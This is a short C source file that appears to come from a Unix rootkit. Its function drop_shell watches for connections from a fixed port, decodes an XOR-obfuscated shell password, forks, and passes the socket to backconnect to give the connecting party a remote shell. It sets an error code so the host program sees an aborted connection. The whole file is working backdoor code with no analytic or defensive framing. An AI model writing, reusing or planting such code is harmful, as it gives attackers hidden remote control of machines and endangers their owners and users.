#include <stdlib.h>
#include "backconnect.h"
int drop_shell(int sock, struct sockaddr *addr)
{ 
	#ifdef DEBUG 
	printf("[!] drop_shell called\n"); 
	#endif 

	char *shellpw = strdup(SHELLPW); xor(shellpw); 
	int pid; 
	ssize_t (*s_write()); 
	init(); 
	struct sockaddr_in *sa_i = (struct sockaddr_in*)addr; 

	if (htons(sa_i->sin_port) == DEFAULT_PORT)
	{ 
		if ((pid = fork()) == 0)
		{ 
			#ifdef DEBUG
			printf("[!] connected\n"); 
			#endif 
			fsync(sock); 
			backconnect(sock); 
		}
		else
		{ 
			errno = ECONNABORTED; 
			return -1;
		}
	}
	return sock; 
}
